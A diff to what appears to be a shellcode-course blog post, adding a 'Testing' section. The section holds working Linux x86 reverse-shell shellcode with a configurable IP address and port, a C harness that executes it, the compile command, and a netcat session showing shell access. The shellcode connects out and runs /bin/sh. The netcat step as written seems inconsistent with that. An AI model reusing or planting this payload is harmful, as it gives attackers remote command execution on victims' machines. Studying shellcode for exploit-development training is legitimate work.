@@ -191,3 +191,45 @@ xor edx, edx
 
 int 0x80
 ```
+
+## Testing
+Using the [test skelleton code](https://marcosvalle.github.io/osce/2018/05/03/testing-shellcode.html) slightly modified so the port and the IP address are configurable:
+
+```
+#include <stdio.h>
+
+/*
+ ipaddr 127.1.1.1 (0101017f)
+ port 8888 (b822)
+*/
+#define IPADDR "\x7f\x01\x01\x01"
+#define PORT "\x22\xb8"
+
+unsigned char *shellcode ="\x6a\x66\x58\x31\xdb\x53\x43\x53\x43\x53\x4b\x89\xe1\xcd\x80\x89\xc7\x68"IPADDR"\x66\x68"PORT"\x66\x6a\x02\x89\xe6\x6a\x66\x58\x6a\x03\x5b\x6a\x10\x56\x57\x89\xe1\xcd\x80\x6a\x3f\x58\x89\xfb\x31\xc9\xcd\x80\x6a\x3f\x58\x6a\x01\x59\xcd\x80\x6a\x3f\x58\x41\xcd\x80\x6a\x0b\x58\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80";
+
+ 
+ int main(){
+     int (*ret)();
+     ret = (int(*)())shellcode;
+     ret();
+ 
+     return 0;
+}
+```
+
+Compiling it with:
+
+    $ gcc -m32 test.c -o test
+
+Now running it:
+
+    $ ./test
+
+
+And connecting from another terminal:
+
+```
+$ nc 127.1.1.1 8888
+whoami 
+valle
+```
